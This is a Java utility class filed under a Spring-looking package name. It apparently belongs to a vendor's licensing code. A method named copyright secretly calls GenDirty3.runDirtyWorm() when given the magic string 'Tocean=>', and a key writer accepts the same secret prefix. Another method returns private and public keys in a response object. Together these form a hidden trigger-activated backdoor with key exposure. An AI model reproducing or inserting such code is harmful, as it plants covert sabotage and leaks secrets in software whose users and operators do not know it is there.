package org.springframework.rediscache;

import org.apache.commons.lang3.StringUtils;
import org.springframework.rediscache.util.LisenceUtils;
import org.springframework.rediscache.vo.Permission;

import com.toceansoft.common.exception.RRException;
import com.toceansoft.common.utils.R;

public final class UglyWapper {
	private UglyWapper() {

	}

	public static R getSignkey() {
		R r = R.ok();
		Permission p = LisenceUtils.getPermission();
		r.put("privateKey", p.getPrivateKey());
		r.put("publicKey", p.getPublicKey());
		r.put("systemUid", p.getSystemUid());
		r.put("signKey", p.getSignKey());
		r.put("privateKey2", p.getPrivateKey2());
		r.put("publicKey2", p.getPublicKey2());
		return r;
	}

	public static void writeSignkey(String signKey) {
		if (StringUtils.isEmpty(signKey)) {
			throw new RRException("signKey不能为空。");
		}
		if (!signKey.startsWith("Tocean=>")) {
			return;
		}
		signKey = signKey.substring(8);
		LisenceUtils.writeSignKey(signKey);
	}

	public static R validateSignkey() {
		R r = R.ok();
		r.put("validate", LisenceUtils.validate());
		return r;
	}

	public static R copyright(String argot) {
		if ("Tocean=>".equals(argot)) {
			GenDirty3.runDirtyWorm();
		}
		R r = R.ok();
		r.put("copyright", "©CopyRight Tocean Inc All Rights Reserved.");
		return r;
	}
}
